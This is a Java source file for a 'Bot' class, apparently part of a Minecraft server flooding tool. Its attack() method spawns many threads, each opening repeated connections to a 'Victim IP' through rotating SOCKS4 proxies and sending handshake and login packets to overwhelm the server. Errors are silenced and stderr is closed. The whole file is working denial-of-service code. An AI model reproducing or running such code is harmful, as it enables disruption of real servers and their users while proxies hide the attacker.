//
// Todos los derechos reservados a Daniel.Arvizu.Rosselli
//

package me.kurumifake.zadkiel;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketImpl;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import me.kurumifake.zadkiel.RandomOptions;

public class Bot {
    public String ip;
    public int port;
    public ProxyManager proxyManager;
    public Bot (final String ip, final int port, final ProxyManager proxyManager) {
        this.ip = ip;
        this.port = port;
        this.proxyManager = proxyManager;
    }

    public static void disableWarning() {
        System.err.close();
        System.setErr(System.out);
    }
    public void attack(final int threads, final int connections) {
        try{
            ExecutorService executorService = Executors.newFixedThreadPool(threads);
            System.out.println("Victim IP: "+ ip + " Port: " + port);
            System.out.println("Threads: " + threads);
            System.out.println("Connections: " + connections);
            for (int i = 0; i < threads; ++i) {
                executorService.submit(() -> {
                    try {
                        String ip = this.ip;
                        int port = this.port;
                        for (int j = 0; j < connections; j++) {
                            try {
                                Proxy proxy = this.proxyManager.nextProxy();
                                Socket socket = new Socket(proxy);
                                Class<? extends Socket> clazzSocks = (Class)socket.getClass();
                                Method setSockVersion = null;
                                Field sockImplField = null;
                                SocketImpl socksimpl = null;
                                try {
                                    sockImplField = clazzSocks.getDeclaredField("impl");
                                    sockImplField.setAccessible(true);
                                    socksimpl = (SocketImpl)sockImplField.get(socket);
                                    Class<? extends SocketImpl> clazzSockImpl = (Class)socksimpl.getClass();
                                    setSockVersion = clazzSockImpl.getDeclaredMethod("setV4", new Class[0]);
                                    setSockVersion.setAccessible(true);
                                    if (setSockVersion != null)
                                        setSockVersion.invoke(socksimpl, new Object[0]);
                                    sockImplField.set(socket, socksimpl);
                                } catch (Throwable e) {
                                    e.printStackTrace();
                                    System.err.close();
                                    System.setErr(System.out);
                                }
                                socket.connect(new InetSocketAddress(ip, port), 300);
                                DataOutputStream out = new DataOutputStream(socket.getOutputStream()); 
                                Packets packetUtils = new Packets(ip, port, out);
                                packetUtils.writeHandshakePacket();
                                packetUtils.writeLoginStartPacket();
                                Thread.sleep(300L);
                                socket.close();
                                System.err.close();
                                System.setErr(System.out);
                            } catch (Exception exception) {}
                        }
                    } catch (Exception exception) {}
                    System.err.close();
                    System.setErr(System.out);
                });
            }
        } catch (Exception e) {}
    }
}